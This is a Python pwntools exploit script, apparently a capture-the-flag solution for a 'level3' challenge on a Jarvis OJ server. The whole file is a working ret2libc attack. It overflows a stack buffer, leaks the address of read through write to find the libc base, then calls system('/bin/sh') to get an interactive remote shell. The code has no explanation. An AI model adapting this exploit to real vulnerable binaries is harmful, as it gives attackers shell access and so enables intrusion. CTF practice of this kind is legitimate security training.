#!/usr/bin/python
from pwn import *
sh = remote('pwn2.jarvisoj.com',9879)
#sh = process('./level3')
elf = ELF('./level3')
libc = ELF('./libc.so')
vul_function = elf.symbols['vulnerable_function']
system_off = libc.symbols['system']
read_off = libc.symbols['read']
read_got = elf.got['read']
write = elf.plt['write']
pad = (0x88 + 4)*'a'
payload1 = pad + p32(write) + p32(vul_function) + p32(1) + p32(read_got) + p32(4)

sh.recv()
sh.sendline(payload1)
read = u32(sh.recv(4))
success("read addr: "+hex(read))

libc_base = read - read_off
system = libc_base + system_off
bin_sh = libc_base + libc.search('/bin/sh').next()
payload2 = pad + p32(system) + p32(666) + p32(bin_sh)


sh.sendline(payload2)
sh.interactive()

